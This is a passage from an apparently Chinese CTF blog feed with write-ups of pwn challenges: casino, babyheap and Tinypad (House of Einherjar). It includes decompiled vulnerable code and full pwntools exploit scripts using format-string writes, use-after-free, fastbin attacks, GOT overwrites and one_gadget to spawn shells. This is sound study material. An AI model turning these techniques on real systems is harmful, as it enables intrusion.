class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">now=int(time())/10+2</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./timerand&quot;)</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int seed;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;seed);</span><br><span class="line">srand(seed);</span><br><span class="line">for(i = 0; i &lt; 100; i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d &quot;,rand());</span><br><span class="line">   &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">sh.sendline(str(now))</span><br><span class="line">rand=sh.recvuntil(&quot;\n&quot;).strip().split(&quot; &quot;)</span><br><span class="line">print rand</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)</span><br><span class="line">sh=process(&apos;./casino&apos;)</span><br><span class="line">sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">for i in range(99):</span><br><span class="line">   sh.sendlineafter(&quot;number: &quot;,rand[i])</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./casino&quot;)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(&quot;%8$p&quot;)</span><br><span class="line">sh.recvuntil(&apos;Welcome &apos;)</span><br><span class="line">seed =eval(sh.recvuntil(&apos;\n&apos;,drop=True))&amp;0xffffffff  &lt;--- 数据类型转换成int型</span><br><span class="line">print seed</span><br><span class="line">sh.close()</span><br><span class="line">seed += 3       &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？</span><br><span class="line">libc = cdll.LoadLibrary(&quot;&quot;)   &lt;--- 突然发现这里为空也不影响？？</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./casino&apos;)</span><br><span class="line">pay = &apos;aaa%11$n&apos;+p64(0x602020)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(pay)</span><br><span class="line">for i in range(99):</span><br><span class="line">sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int create()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t edit()</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line"></span><br><span class="line">  printf(&quot;Content? &quot;);</span><br><span class="line">  result = read(0, buf, 0x40uLL);</span><br><span class="line">  edit_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  result = printf(&quot;Content: %s\n&quot;, buf);</span><br><span class="line">  show_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  free(buf);                                    // UAF</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 0LL;</span><br><span class="line">  delete_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  printf(&quot;Fill &quot;);</span><br><span class="line">  read(0, buf, 0x40uLL);</span><br><span class="line">  return fill_inuse++ + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 create_inuse   </span><br><span class="line">.bss:00000000006020A8 edit_inuse   </span><br><span class="line">.bss:00000000006020B0 show_inuse      </span><br><span class="line">.bss:00000000006020B8 delete_inuse    </span><br><span class="line">.bss:00000000006020C0 fill_inuse     </span><br><span class="line">.bss:00000000006020C8 ; void *buf</span><br></pre></td></tr></table></figure><p>我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针<br>所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">def new():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def edit(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">  sh.sendafter(&quot;Content? &quot;,note)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">def  show():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">  sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">  return sh.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def  fill(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;)</span><br><span class="line">  sh.sendafter(&quot;Fill &quot;,note)</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">delete()</span><br><span class="line">edit(p64(0x602095-8))</span><br><span class="line">new()</span><br><span class="line">fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">libc_addr = u64(sh.recvuntil(&apos;\n&apos;)[:-1].ljust(8,&apos;\x00&apos;))-libc.plt[&apos;atoi&apos;]</span><br><span class="line">print &quot;libc_addr : &quot; + hex(libc_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">system_addr = libc_addr + libc.plt[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.8-HouseOfEinherjar</title>
      <link href="/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/"/>
      <url>/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Einherjar-原理"><a href="#House-of-Einherjar-原理" class="headerlink" title="House of Einherjar 原理"></a>House of Einherjar 原理</h1><p>感觉像是把好几种漏洞结合起来：<br>    off by one<br>    unlink （需要能够完全溢出到下一个堆来控制<br>    chunk entend or shrink; 但是细节却不相同。</p><p>该利用需要：</p><ol><li>chunk能够覆盖next_chunk的pre_size并修改pre_inuse位</li><li>泄露地址使得unlink 检查pre_size与size时能够绕过</li><li>fake_chunk的fd 与 bk指针需要能够绕过检查</li></ol><p>当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中</p><h1 id="Tinypad"><a href="#Tinypad" class="headerlink" title="Tinypad"></a>Tinypad</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>程序自己重写了许多write read函数<br>主要功能 add edit delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) = i + &apos;1&apos;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3);</span><br><span class="line">      &#125;</span><br><span class="line">      writeln(&quot;\n&quot;, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      write_n(</span><br><span class="line">    &quot;+- MENU -----------------------------------------------------------------------+\n&quot;</span><br><span class="line">    &quot;| [A] Add memo                                                                 |\n&quot;</span><br><span class="line">    &quot;| [D] Delete memo                                                              |\n&quot;</span><br><span class="line">    &quot;| [E] Edit memo                                                                |\n&quot;</span><br><span class="line">    &quot;| [Q] Quit                                                                     |\n&quot;</span><br><span class="line">    &quot;+------------------------------------------------------------------------------+\n&quot;,</span><br><span class="line">    486LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( cmd == &apos;D&apos; )                           // delete</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse</span><br><span class="line">        &#123;</span><br><span class="line">          free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr</span><br><span class="line">          *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      if ( cmd = &apos;E&apos; )</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c = &apos;0&apos;;</span><br><span class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) != &apos;Y&apos; )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v6 = strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v6);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v7, &apos;\n&apos;);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until((char *)&amp;c, 1uLL, &apos;\n&apos;);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      if ( cmd != &apos;A&apos; )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] )</span><br><span class="line">        ++idx;</span><br><span class="line">      if ( idx == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        size = -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        size = read_int();</span><br><span class="line">        if ( size &lt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = size;</span><br><span class="line">          if ( (unsigned __int64)size &gt; 0x100 )</span><br><span class="line">            v5 = 256;</span><br><span class="line">        &#125;</span><br><span class="line">        size = v5;                              // max size =256</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5;</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size);</span><br><span class="line">        if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu);</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( cnt != 81 );</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题</p><p>再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./tinypad&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;A&quot;)</span><br><span class="line">    p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line">def delete(index):</span><br><span class="line"> </span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;D&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line">def edit(index, content, ok=True):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;E&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;)</span><br><span class="line">    if ok:</span><br><span class="line">        p.sendline(&quot;Y&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendline(&quot;n&quot;)</span><br><span class="line"> </span><br><span class="line">#stage one</span><br><span class="line">add(0x80, &quot;A&quot;*0x80)</span><br><span class="line">add(0x80, &quot;B&quot;*0x80)</span><br><span class="line">add(0x80, &quot;C&quot;*0x80)</span><br><span class="line">add(0x80, &quot;D&quot;*0x80)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">heap = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x120</span><br><span class="line">log.info(&quot;heap_base: %s&quot; % hex(heap))</span><br><span class="line">p.recvuntil(&quot; #   INDEX: 3\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8, &quot;\x00&quot;)) - 0x58</span><br><span class="line">log.info(&quot;main_arena: %s&quot; % hex(main_arena))</span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"> </span><br><span class="line">#stage two</span><br><span class="line">add(0x18, &quot;A&quot;*0x18)</span><br><span class="line">add(0x100, &quot;B&quot;*0xf8 + p64(0x11))</span><br><span class="line">add(0x100, &quot;C&quot;*0xf8)</span><br><span class="line">add(0x100, &quot;D&quot;*0xf8)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tinypad = 0x602040</span><br><span class="line">offset = heap + 0x20 - 0x602040 - 0x20</span><br><span class="line">fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2</span><br><span class="line"> </span><br><span class="line">edit(3, &quot;D&quot;*0x20 + fake_chunk)</span><br><span class="line">zero_byte_number = 8 - len(p64(offset).strip(&quot;\x00&quot;))</span><br><span class="line">for i in range(zero_byte_number+1):</span><br><span class="line">  data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\x00&quot;).rjust(8-i, &apos;f&apos;)</span><br><span class="line">  edit(1, data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">#stage three</span><br><span class="line">libc_base = main_arena + 0x58 - 0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: %s&quot; % hex(libc_base))</span><br><span class="line">one_gadget =  libc_base + 0x45216</span><br><span class="line">environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;]</span><br><span class="line"> </span><br><span class="line">add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148))</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x8*30</span><br><span class="line">log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))</span><br><span class="line">log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;Q&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.7-HouseOfForce</title>
      <link href="/2019/01/22/introduction-to-pwn2-7-houseofforce/"/>
      <url>/2019/01/22/introduction-to-pwn2-7-houseofforce/</url>
